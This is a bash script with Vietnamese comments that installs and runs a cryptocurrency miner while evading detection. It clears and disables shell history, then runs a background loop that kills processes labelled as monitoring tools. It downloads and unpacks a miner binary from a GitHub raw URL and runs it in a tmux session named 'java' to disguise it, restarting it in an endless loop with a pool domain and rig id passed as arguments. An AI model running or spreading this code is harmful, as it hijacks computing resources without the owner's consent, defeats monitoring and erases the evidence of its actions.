#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 🔁 Kill các tiến trình giám sát
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/java/java" ]; then
    echo "[+] Downloading miner..."
    rm -rf java java.tar.gz
    wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x java/java
    rm -f java.tar.gz
fi

# 🔁 Vòng lặp chạy miner
echo "[+] Vòng lặp ..."
while true; do
    pkill -f "$(pwd)/java/java" 2>/dev/null
    echo "[+] Kill process - sleep 5s..."
    sleep 10

    tmux kill-session -t $SESSION 2>/dev/null
    echo "[+] run process - sleep 5 phút..."
    tmux new-session -s $SESSION -d
    tmux send-keys -t $SESSION "
        $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
    " C-m

    sleep 120
done
